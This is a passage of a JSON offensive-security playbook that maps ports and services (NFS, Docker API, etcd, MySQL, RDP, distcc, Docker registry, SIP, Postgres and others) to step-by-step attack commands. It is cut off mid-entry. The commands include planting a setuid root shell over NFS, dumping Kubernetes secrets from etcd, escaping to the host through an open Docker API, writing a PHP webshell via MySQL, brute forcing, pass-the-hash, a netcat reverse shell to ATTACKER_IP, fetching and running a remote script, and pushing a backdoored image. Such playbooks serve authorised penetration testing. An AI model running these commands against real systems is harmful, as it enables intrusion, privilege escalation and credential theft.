    "when": "if web station exposed",
    "yields": [
     "users"
    ]
   }
  ]
 },
 {
  "ports": [
   2049
  ],
  "service": "nfs",
  "aliases": [
   "nfs",
   "nfs_acl",
   "nfsrdma"
  ],
  "proto": "both",
  "risk": "critical",
  "note": "Two settings decide everything: no_root_squash (copy in a setuid root binary and you own the host) and UID matching (create a local user with the owner's UID and the permissions just apply); if showmount returns nothing it is probably NFSv4, so blind-mount / with -t nfs4 before concluding there are no exports.",
  "categories": [
   "recon",
   "file-ops",
   "linux-escalation",
   "initial-foothold",
   "netexec"
  ],
  "attack": [
   "T1046",
   "T1083",
   "T1222",
   "T1548.001",
   "T1021"
  ],
  "keywords": [
   "showmount",
   "nxc nfs",
   "mount -t nfs",
   "nfs-ls",
   "no_root_squash"
  ],
  "yields": [
   "file-read",
   "creds",
   "admin",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "List exports and the hosts allowed to mount them",
    "cmd": "showmount -e <TARGET_IP>",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "recon",
    "label": "Read exports, UIDs and perms without mounting",
    "cmd": "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p111,2049 <TARGET_IP> -oN nmap_nfs.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate shares via netexec",
    "cmd": "nxc nfs <TARGET_IP> --shares",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Mount a listed export (v3 is the permissive one)",
    "cmd": "sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3,nolock <TARGET_IP>:/EXPORT_PATH /mnt/nfs",
    "when": "if exports listed",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Blind NFSv4 mount of the root export",
    "cmd": "sudo mount -t nfs4 <TARGET_IP>:/ /mnt/nfs",
    "when": "if showmount returns nothing",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "privesc",
    "label": "no_root_squash -> plant a setuid root shell, run it on the box",
    "cmd": "sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod +s /mnt/nfs/rootbash   # on target: /path/rootbash -p",
    "when": "if a writable export mounts as root (no_root_squash)",
    "yields": [
     "admin"
    ]
   },
   {
    "phase": "privesc",
    "label": "UID-match a protected file to read it as the owner",
    "cmd": "sudo useradd -u 1001 -M lowpriv && sudo -u lowpriv cat /mnt/nfs/home/user/.ssh/id_rsa",
    "when": "if files are owned by a specific non-root UID",
    "yields": [
     "creds",
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Hunt keys, histories and vaults across the mount",
    "cmd": "find /mnt/nfs \\( -name 'id_rsa' -o -name '*.kdbx' -o -name '.bash_history' -o -name '*.conf' \\) 2>/dev/null",
    "when": "after any successful mount",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   2181,
   2888,
   3888
  ],
  "service": "zookeeper",
  "aliases": [
   "zookeeper",
   "apache-zookeeper",
   "clustering"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "Zookeeper stores the live configuration for whatever cluster it coordinates (Kafka, HBase, NiFi, SolrCloud), so the four-letter 'envi'/'conf' commands and a zkCli walk of the znode tree routinely hand you the service credentials and broker endpoints those systems trust.",
  "categories": [
   "service-exploitation",
   "recon",
   "observability-sec"
  ],
  "attack": [
   "T1046",
   "T1552.001",
   "T1213",
   "T1190"
  ],
  "keywords": [
   "zookeeper",
   "zkcli",
   "four-letter",
   "echo envi",
   "echo mntr",
   "nc 2181"
  ],
  "yields": [
   "creds",
   "source-code"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm service + liveness",
    "cmd": "nmap -p2181 -sV <TARGET_IP> -oN nmap_zk.txt ; echo ruok | nc <TARGET_IP> 2181",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Four-letter environment/config dump",
    "cmd": "echo envi | nc <TARGET_IP> 2181 ; echo conf | nc <TARGET_IP> 2181",
    "when": "if four-letter words whitelisted",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List connected clients (pivot targets)",
    "cmd": "echo stat | nc <TARGET_IP> 2181 ; echo mntr | nc <TARGET_IP> 2181",
    "when": "if four-letter words whitelisted",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Walk the znode tree for secrets",
    "cmd": "zkCli.sh -server <TARGET_IP>:2181 ls / ; zkCli.sh -server <TARGET_IP>:2181 get /config",
    "when": "if client access allowed",
    "yields": [
     "creds",
     "source-code"
    ]
   }
  ]
 },
 {
  "ports": [
   2375,
   2376
  ],
  "service": "docker-api",
  "aliases": [
   "docker",
   "docker-api",
   "docker-ssl"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "An unauthenticated 2375 is root on the host, full stop — bind-mount / into a throwaway container and chroot, and even without run rights the container Config.Env leaks the creds developers passed as environment variables.",
  "categories": [
   "docker-engine",
   "docker-security",
   "container-cloud",
   "secrets-mgmt"
  ],
  "attack": [
   "T1610",
   "T1611",
   "T1613",
   "T1552.007"
  ],
  "keywords": [
   "docker -h tcp",
   "curl 2375",
   "/containers/json",
   "/version",
   "chroot /hostfs",
   "docker.sock"
  ],
  "yields": [
   "shell",
   "admin",
   "creds",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm unauthenticated Docker API",
    "cmd": "curl -s --max-time 5 http://<TARGET_IP>:2375/version | jq .",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List containers and images",
    "cmd": "docker -H tcp://<TARGET_IP>:2375 ps -a && docker -H tcp://<TARGET_IP>:2375 images",
    "when": "if API responds",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Harvest secrets from container environments",
    "cmd": "curl -s http://<TARGET_IP>:2375/containers/json?all=1 | jq -r '.[].Id' | while read id; do curl -s http://<TARGET_IP>:2375/containers/$id/json | jq -r '.Config.Env[]?'; done",
    "when": "if API responds",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "privesc",
    "label": "Host filesystem escape via bind mount",
    "cmd": "docker -H tcp://<TARGET_IP>:2375 run --rm -v /:/hostfs -it alpine chroot /hostfs /bin/sh",
    "when": "if image pull/exec allowed",
    "yields": [
     "shell",
     "admin"
    ]
   },
   {
    "phase": "loot",
    "label": "Read host files without an interactive shell",
    "cmd": "docker -H tcp://<TARGET_IP>:2375 run --rm -v /:/hostfs alpine cat /hostfs/root/.ssh/id_rsa /hostfs/etc/shadow",
    "when": "if container exec allowed",
    "yields": [
     "creds",
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "TLS port with recovered client certs",
    "cmd": "docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H tcp://<TARGET_IP>:2376 ps",
    "when": "if 2376 and client certs found",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   2379,
   2380
  ],
  "service": "etcd",
  "aliases": [
   "etcd",
   "etcd-client",
   "etcd-server"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "etcd is the cluster's whole brain stored in plaintext — an unauthenticated 2379 dumps every Kubernetes Secret and ServiceAccount token under /registry/secrets, so you walk away with a token that is admin somewhere.",
  "categories": [
   "k8s-security",
   "secrets-mgmt",
   "k8s-ops"
  ],
  "attack": [
   "T1552.001",
   "T1552.007",
   "T1613",
   "T1530"
  ],
  "keywords": [
   "etcdctl",
   "etcdctl get",
   "/v2/keys",
   "curl 2379",
   "/registry/secrets",
   "endpoint health"
  ],
  "yields": [
   "creds",
   "hashes",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Version and unauthenticated reachability",
    "cmd": "curl -s --max-time 5 http://<TARGET_IP>:2379/version",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Health and member list (v3 API)",
    "cmd": "ETCDCTL_API=3 etcdctl --endpoints=http://<TARGET_IP>:2379 endpoint health && ETCDCTL_API=3 etcdctl --endpoints=http://<TARGET_IP>:2379 member list",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List every key in the store",
    "cmd": "ETCDCTL_API=3 etcdctl --endpoints=http://<TARGET_IP>:2379 get / --prefix --keys-only",
    "when": "if unauthenticated",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Dump all Kubernetes secrets",
    "cmd": "ETCDCTL_API=3 etcdctl --endpoints=http://<TARGET_IP>:2379 get /registry/secrets --prefix | strings",
    "when": "if secrets readable",
    "yields": [
     "creds",
     "hashes"
    ]
   },
   {
    "phase": "loot",
    "label": "Extract ServiceAccount JWTs for API takeover",
    "cmd": "ETCDCTL_API=3 etcdctl --endpoints=http://<TARGET_IP>:2379 get /registry/secrets --prefix | grep -a -oE 'eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'",
    "when": "if secrets readable",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "enum",
    "label": "Legacy v2 recursive key read",
    "cmd": "curl -s http://<TARGET_IP>:2379/v2/keys/?recursive=true | jq .",
    "when": "if etcd v2",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   3000
  ],
  "service": "http-dev",
  "aliases": [
   "http",
   "http-alt",
   "ppp",
   "hbci"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Port 3000 is usually a dev-stack app (Grafana, Node/Express, Gitea) — fingerprint it first, because the fast wins are version CVEs like Grafana's unauth path-traversal file read (CVE-2021-43798).",
  "categories": [
   "recon",
   "web-exploitation",
   "vuln-assessment",
   "initial-foothold"
  ],
  "attack": [
   "T1190",
   "T1083",
   "T1046",
   "T1552.001"
  ],
  "keywords": [
   "whatweb",
   "grafana",
   "curl --path-as-is",
   "nuclei",
   "feroxbuster",
   "cve-2021-43798"
  ],
  "yields": [
   "file-read",
   "creds",
   "source-code",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Identify the dev app",
    "cmd": "whatweb http://<TARGET_IP>:<PORT>/ && curl -s http://<TARGET_IP>:<PORT>/api/health",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Nuclei + dir brute",
    "cmd": "nuclei -u http://<TARGET_IP>:<PORT> -t http/ -severity high,critical && feroxbuster -u http://<TARGET_IP>:<PORT> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Grafana plugin path-traversal file read",
    "cmd": "curl -s --path-as-is 'http://<TARGET_IP>:<PORT>/public/plugins/alertlist/../../../../../../../../etc/passwd'",
    "when": "if Grafana < 8.3.1 (CVE-2021-43798)",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Read Grafana DB / config for creds",
    "cmd": "curl -s --path-as-is 'http://<TARGET_IP>:<PORT>/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'",
    "when": "if the LFI works",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   3268,
   3269
  ],
  "service": "global-catalog",
  "aliases": [
   "globalcatldap",
   "globalcatldapssl",
   "msft-gc",
   "msft-gc-ssl"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The Global Catalog answers with an empty base DN and returns objects from every domain in the forest in a single query, so in a multi-domain or trust scenario this is how you enumerate the whole forest and spot cross-domain paths that a plain 389 bind to one DC would never show you.",
  "categories": [
   "ad-recon",
   "bloodhound",
   "netexec"
  ],
  "attack": [
   "T1087.002",
   "T1018",
   "T1482"
  ],
  "keywords": [
   "ldapsearch 3268",
   "global catalog",
   "windapsearch",
   "nxc ldap",
   "gc://"
  ],
  "yields": [
   "users",
   "domain-user"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm GC is listening and grab RootDSE",
    "cmd": "ldapsearch -x -H ldap://<DC_IP>:3268 -b '' -s base '(objectClass=*)' | tee gc_rootdse.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Forest-wide user search with empty base DN",
    "cmd": "ldapsearch -x -H ldap://<DC_IP>:3268 -D '<USER>@<DOMAIN>' -w '<PASS>' -b '' '(&(objectCategory=person)(objectClass=user))' sAMAccountName description memberOf userPrincipalName",
    "when": "if creds known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Enumerate privileged groups across the forest",
    "cmd": "ldapsearch -x -H ldap://<DC_IP>:3268 -D '<USER>@<DOMAIN>' -w '<PASS>' -b '' '(&(objectCategory=group)(adminCount=1))' sAMAccountName member",
    "when": "if creds known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "BloodHound collection targeting the GC for trusts",
    "cmd": "bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -gc <DC_IP> -ns <DC_IP> -c All --zip",
    "when": "if creds known and forest has trusts",
    "yields": [
     "domain-user"
    ]
   }
  ]
 },
 {
  "ports": [
   3306
  ],
  "service": "mysql",
  "aliases": [
   "mysql",
   "mariadb"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The win is almost never the daemon itself but a reused root/app password from a web config plus the FILE privilege, which turns the DB into arbitrary file read and webshell-into-webroot.",
  "categories": [
   "service-exploitation",
   "password-ops",
   "file-ops",
   "metasploit"
  ],
  "attack": [
   "T1046",
   "T1110.001",
   "T1078",
   "T1210",
   "T1005"
  ],
  "keywords": [
   "mysql",
   "mysql-info",
   "mysql-empty-password",
   "hydra mysql",
   "mysql_login",
   "load_file",
   "into outfile",
   "mysqldump"
  ],
  "yields": [
   "creds",
   "file-read",
   "foothold",
   "source-code"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint and check empty root",
    "cmd": "nmap -sV -p3306 --script=mysql-info,mysql-empty-password,mysql-enum <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Password spray / brute",
    "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
    "when": "if no creds known",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Authenticate to the instance",
    "cmd": "mysql -h <TARGET_IP> -u <USER> -p'<PASS>'",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "enum",
    "label": "Enumerate privileges and schemas",
    "cmd": "mysql -h <TARGET_IP> -u <USER> -p'<PASS>' -e 'SELECT current_user(); SHOW GRANTS; SHOW DATABASES;'",
    "when": "if creds known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "Arbitrary file read via FILE privilege",
    "cmd": "mysql -h <TARGET_IP> -u <USER> -p'<PASS>' -e \"SELECT LOAD_FILE('/etc/passwd');\"",
    "when": "if user holds FILE privilege",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Write webshell into webroot",
    "cmd": "mysql -h <TARGET_IP> -u <USER> -p'<PASS>' -e \"SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/sh.php';\"",
    "when": "if FILE priv and secure_file_priv unset and webroot writable",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump all databases for creds/hashes",
    "cmd": "mysqldump -h <TARGET_IP> -u <USER> -p'<PASS>' --all-databases > loot.sql",
    "when": "if creds known",
    "yields": [
     "creds",
     "hashes"
    ]
   }
  ]
 },
 {
  "ports": [
   3389
  ],
  "service": "rdp",
  "aliases": [
   "ms-wbt-server",
   "rdp",
   "ms-term-serv"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "RDP's win is valid-account reuse and pass-the-hash (restricted-admin), BlueKeep on unpatched 2008/7, and NLA-off boxes that leak hostname and domain pre-auth.",
  "categories": [
   "password-ops",
   "netexec",
   "lateral-move",
   "post-exploitation-win",
   "initial-foothold"
  ],
  "attack": [
   "T1021.001",
   "T1110.003",
   "T1078",
   "T1550.002"
  ],
  "keywords": [
   "xfreerdp",
   "rdesktop",
   "nxc rdp",
   "hydra rdp",
   "rdp-ntlm-info",
   "bluekeep",
   "cve_2019_0708"
  ],
  "yields": [
   "foothold",
   "shell",
   "admin"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Leak hostname/domain + cert via NTLM info",
    "cmd": "nmap -sV -p<PORT> --script rdp-ntlm-info,rdp-enum-encryption <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "BlueKeep (CVE-2019-0708) vulnerability check",
    "cmd": "msfconsole -q -x \"use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <TARGET_IP>; run; exit\"",
    "when": "if host looks unpatched (Server 2008 / Windows 7)",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Validate creds before connecting",
    "cmd": "nxc rdp <TARGET_IP> -u <USER> -p '<PASS>'",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Brute force (lockout-aware, single thread)",
    "cmd": "hydra -L users.txt -P passwords.txt rdp://<TARGET_IP> -t 1",
    "when": "if no creds and no lockout policy",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "lateral",
    "label": "Interactive session with password",
    "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /cert:ignore /dynamic-resolution +clipboard",
    "when": "if creds known",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "lateral",
    "label": "Pass-the-hash (restricted admin mode)",
    "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<HASH> /cert:ignore",
    "when": "if NT hash of a local admin is held",
    "yields": [
     "admin",
     "shell"
    ]
   },
   {
    "phase": "loot",
    "label": "Redirect a local folder to move files in/out",
    "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /cert:ignore /drive:loot,/tmp/loot",
    "when": "if interactive access and files must be transferred",
    "yields": [
     "file-read"
    ]
   }
  ]
 },
 {
  "ports": [
   3632
  ],
  "service": "distcc",
  "aliases": [
   "distcc"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "distccd exposed to the network is a straight unauthenticated RCE (CVE-2004-2687 command injection) — it runs whatever compiler command you feed it, so it is a one-command shell as the daemon user, and historically the pivot into the lightdm/root chain on classic HTB boxes.",
  "categories": [
   "service-exploitation",
   "metasploit",
   "initial-foothold",
   "vuln-assessment"
  ],
  "attack": [
   "T1046",
   "T1190",
   "T1203"
  ],
  "keywords": [
   "distcc-cve2004-2687",
   "distcc_exec",
   "distcc",
   "nmap distcc"
  ],
  "yields": [
   "shell",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm the daemon and test command execution",
    "cmd": "nmap -p3632 --script distcc-cve2004-2687 --script-args='distcc-cve2004-2687.cmd=id' <TARGET_IP> -oN nmap_distcc.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Get a reverse shell via Metasploit",
    "cmd": "msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS <TARGET_IP>; set LHOST <LHOST>; set LPORT <LPORT>; run; exit'",
    "when": "always",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "foothold",
    "label": "Manual one-shot command execution",
    "cmd": "nmap -p3632 --script distcc-cve2004-2687 --script-args='distcc-cve2004-2687.cmd=nc <ATTACKER_IP> <LPORT> -e /bin/sh' <TARGET_IP>",
    "when": "if listener running",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "privesc",
    "label": "Enumerate for local privesc after shell",
    "cmd": "wget http://<ATTACKER_IP>/linpeas.sh -O /tmp/lp.sh && sh /tmp/lp.sh",
    "when": "if shell obtained",
    "yields": [
     "admin"
    ]
   }
  ]
 },
 {
  "ports": [
   4369,
   25672
  ],
  "service": "epmd",
  "aliases": [
   "epmd",
   "erlang-port-mapper",
   "erlang"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "epmd just maps Erlang node names to their distribution ports, but the whole family hinges on the Erlang cookie: once you read it (RabbitMQ writes it to .erlang.cookie and ships weak defaults) distributed Erlang lets you call os:cmd/2 and run code as the node's service account.",
  "categories": [
   "service-exploitation",
   "metasploit",
   "exploit-dev",
   "post-exploitation-linux"
  ],
  "attack": [
   "T1210",
   "T1552.001",
   "T1059",
   "T1046"
  ],
  "keywords": [
   "epmd",
   "erlang cookie",
   "erlang_cookie_rce",
   "epmd-info",
   ".erlang.cookie",
   "distributed-erlang"
  ],
  "yields": [
   "shell",
   "foothold"
  ],
  "needs": [
   "cookie"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint epmd",
    "cmd": "nmap -p4369 -sV <TARGET_IP> -oN nmap_epmd.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List node names + distribution ports",
    "cmd": "nmap -p4369 --script epmd-info <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Recover the Erlang cookie if a foothold exists",
    "cmd": "cat /var/lib/rabbitmq/.erlang.cookie ; cat ~/.erlang.cookie",
    "when": "if any shell on host",
    "yields": [
     "cookie"
    ]
   },
   {
    "phase": "foothold",
    "label": "Distributed Erlang RCE with the cookie",
    "cmd": "msfconsole -q -x 'use exploit/multi/misc/erlang_cookie_rce; set RHOSTS <TARGET_IP>; set RPORT 25672; set COOKIE <PASS>; set LHOST <ATTACKER_IP>; set LPORT <LPORT>; run; exit'",
    "when": "if cookie known",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   5000
  ],
  "service": "docker-registry",
  "aliases": [
   "commplex-main",
   "registry",
   "docker-registry"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "An open v2 registry lets you pull every image, and the win is in the layers — unpack them and grep for hardcoded creds, private keys and source; a writable registry additionally lets you poison an image the cluster will later pull.",
  "categories": [
   "docker-security",
   "supply-chain",
   "secrets-mgmt"
  ],
  "attack": [
   "T1552.001",
   "T1525",
   "T1613"
  ],
  "keywords": [
   "/v2/_catalog",
   "docker pull",
   "skopeo",
   "registry",
   "tags/list",
   "dive"
  ],
  "yields": [
   "creds",
   "source-code",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "List the image catalog",
    "cmd": "curl -s http://<TARGET_IP>:5000/v2/_catalog | jq .",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate tags for each repository",
    "cmd": "for i in $(curl -s http://<TARGET_IP>:5000/v2/_catalog | jq -r '.repositories[]'); do echo \"$i:\"; curl -s http://<TARGET_IP>:5000/v2/$i/tags/list; done",
    "when": "if catalog readable",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Pull an image over plain HTTP",
    "cmd": "skopeo copy --src-tls-verify=false docker://<TARGET_IP>:5000/$IMAGE:latest dir:./layers",
    "when": "if registry reachable",
    "yields": [
     "source-code"
    ]
   },
   {
    "phase": "loot",
    "label": "Extract layers and grep for secrets",
    "cmd": "mkdir -p extracted; for l in ./layers/*; do tar -xf \"$l\" -C extracted 2>/dev/null; done; grep -rinE 'password|secret|api[_-]?key|BEGIN [A-Z ]*PRIVATE KEY' extracted",
    "when": "if image pulled",
    "yields": [
     "creds",
     "source-code"
    ]
   },
   {
    "phase": "lateral",
    "label": "Push a backdoored image into the pipeline",
    "cmd": "docker tag my-evil <TARGET_IP>:5000/$IMAGE:latest && docker push <TARGET_IP>:5000/$IMAGE:latest",
    "when": "if registry writable",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   5060,
   5061
  ],
  "service": "sip",
  "aliases": [
   "sip",
   "sip-tls"
  ],
  "proto": "both",
  "risk": "high",
  "note": "The real win is extension enumeration then PIN/password spraying against a PBX with no lockout — a cracked SIP account lets you register a soft-phone and place/record calls, and REGISTER/OPTIONS replies leak the exact Asterisk/FreePBX build and internal hostnames.",
  "categories": [
   "recon",
   "service-exploitation",
   "password-ops",
   "metasploit"
  ],
  "attack": [
   "T1046",
   "T1110",
   "T1595.002"
  ],
  "keywords": [
   "svmap",
   "svwar",
   "svcrack",
   "sipvicious",
   "sip-methods",
   "sip-enum-users",
   "sipsak",
   "nmap sip"
  ],
  "yields": [
   "users",
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "SIP methods, fingerprint and user enum via NSE",
    "cmd": "nmap -sU -sV -p5060,5061 --script sip-methods,sip-enum-users <TARGET_IP> -oN nmap_sip.txt",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "recon",
    "label": "Discover live SIP devices/PBX",
    "cmd": "svmap <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate valid extensions",
    "cmd": "svwar -m INVITE -e 100-999 <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Manual OPTIONS banner (leaks PBX version/host)",
    "cmd": "sipsak -vv -s sip:<USER>@<TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate/register via Metasploit",
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/sip/enumerator; set RHOSTS <TARGET_IP>; run; exit'",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Crack the PIN/secret for a discovered extension",
    "cmd": "svcrack -u <USER> -d /usr/share/wordlists/rockyou.txt <TARGET_IP>",
    "when": "if extensions known and no lockout",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   5353
  ],
  "service": "mdns",
  "aliases": [
   "mdns",
   "zeroconf"
  ],
  "proto": "udp",
  "risk": "low",
  "note": "mDNS (Bonjour/Avahi) is free internal recon — a single service-discovery query returns hostnames, OS hints and advertised services (AirPlay, SSH, printers, _workstation records) for the whole segment, and the device name often discloses the user and asset role.",
  "categories": [
   "recon",
   "vuln-assessment",
   "pivoting"
  ],
  "attack": [
   "T1046",
   "T1590",
   "T1557"
  ],
  "keywords": [
   "dns-service-discovery",
   "avahi-browse",
   "mdns-scan",
   "nmap mdns",
   "pholus"
  ],
  "yields": [
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Enumerate advertised services via NSE",
    "cmd": "nmap -sU -p5353 --script dns-service-discovery <TARGET_IP> -oN nmap_mdns.txt",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "recon",
    "label": "Browse all mDNS services on the segment",
    "cmd": "avahi-browse -a -r -t",
    "when": "if on same L2 segment",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Active mDNS discovery/spoofing sweep",
    "cmd": "python3 pholus.py eth0 -rq -stimeout 10",
    "when": "if on same L2 segment",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   5357
  ],
  "service": "wsdapi",
  "aliases": [
   "wsdapi",
   "http"
  ],
  "proto": "tcp",
  "risk": "low",
  "note": "WSDAPI on 5357 is an HTTP.sys device-discovery endpoint with no direct exploit path - treat it as a reliable 'this is a live modern Windows host' fingerprint plus an occasional hostname/model leak in the device description, then pivot your effort to SMB, RPC and WinRM.",
  "categories": [
   "recon",
   "vuln-assessment"
  ],
  "attack": [
   "T1046",
   "T1018"
  ],
  "keywords": [
   "curl",
   "nmap -p5357",
   "wsdd",
   "wsdapi",
   "http-title"
  ],
  "yields": [],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm the listener and grab the title",
    "cmd": "nmap -p5357 -sV --script http-title,http-headers <TARGET_IP> -oN nmap_wsd.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "Pull the raw device description",
    "cmd": "curl -s http://<TARGET_IP>:5357/ -H 'Content-Type: application/soap+xml'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Discover other WSD devices on the subnet",
    "cmd": "nmap --script broadcast-wsdd-discover",
    "when": "if on the local subnet",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   5432
  ],
  "service": "postgres",
  "aliases": [
   "postgresql",
   "postgres"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "A superuser login is effectively a shell: COPY ... FROM/TO PROGRAM (CVE-2019-9193) runs OS commands and large objects give arbitrary file read/write.",
  "categories": [
   "service-exploitation",
   "password-ops",
   "metasploit",
   "file-ops"
  ],
  "attack": [
   "T1046",
   "T1110.001",
   "T1078",
   "T1210",
   "T1059"
  ],
  "keywords": [
   "postgres",
   "psql",
   "pgsql-brute",
   "postgres_login",
   "copy from program",
   "lo_import",
   "hydra postgres"
  ],
  "yields": [
   "shell",
   "creds",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint and brute weak creds",
    "cmd": "nmap -sV -p5432 --script=pgsql-brute <TARGET_IP>",
    "when": "always",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "enum",
    "label": "Heavier credential spray",
    "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt postgres://<TARGET_IP>",
    "when": "if no creds known",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Authenticate with psql",
    "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "enum",
    "label": "List databases and roles",
    "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres -c '\\l' -c '\\du'",
    "when": "if creds known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "RCE via COPY FROM PROGRAM",
